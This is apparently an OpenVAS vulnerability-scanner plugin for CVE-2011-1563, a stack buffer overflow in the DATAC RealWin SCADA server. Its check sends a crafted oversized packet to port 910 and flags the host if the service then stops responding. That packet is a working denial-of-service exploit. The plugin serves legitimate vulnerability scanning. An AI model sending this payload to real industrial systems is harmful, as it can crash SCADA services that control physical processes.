if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902528" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-06-24 16:31:03 +0200 (Fri, 24 Jun 2011)" );
	script_bugtraq_id( 46937 );
	script_cve_id( "CVE-2011-1563" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "DATAC RealWin SCADA Server On_FC_CONNECT_FCS_a_FILE Buffer Overflow Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/43848" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17417/" );
	script_xref( name: "URL", value: "http://aluigi.altervista.org/adv/realwin_5-adv.txt" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Buffer overflow" );
	script_dependencies( "find_service.sc" );
	script_require_ports( 910 );
	script_tag( name: "impact", value: "Successful exploitation may allow remote attackers to execute
arbitrary code in the context of the application. Failed exploit attempts will
cause a denial-of-service condition." );
	script_tag( name: "affected", value: "DATAC RealFlex RealWin 2.1 (Build 6.1.10.10) and prior." );
	script_tag( name: "insight", value: "The flaw is due to a boundary error when processing various
On_FC_BINFILE_FCS_*FILE packets, which can be exploited to cause a stack
based buffer overflow by sending specially crafted packets to port 910." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running DATAC RealWin SCADA Server and is prone to
buffer overflow vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
port = 910;
if(!get_port_state( port )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
banner = recv( socket: soc, length: 100 );
if(!IsMatchRegexp( banner, "^\x10\x23\x54\x67\x00" )){
	exit( 0 );
}
head = raw_string( 0x10, 0x23, 0x54, 0x67, 0x24, 0x08, 0x00, 0x00, 0x01, 0x00, 0x10, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00 );
junk = crap( data: "a", length: 2058 );
tail = raw_string( 0x00, 0x35, 0x1c, 0x45, 0x54, 0x01, 0x00, 0x00, 0x40, 0x00, 0x02, 0x00, 0x00, 0x00 );
send( socket: soc, data: head + junk + tail );
close( soc );
sleep( 5 );
soc = open_sock_tcp( port );
if(!soc){
	security_message( port );
}

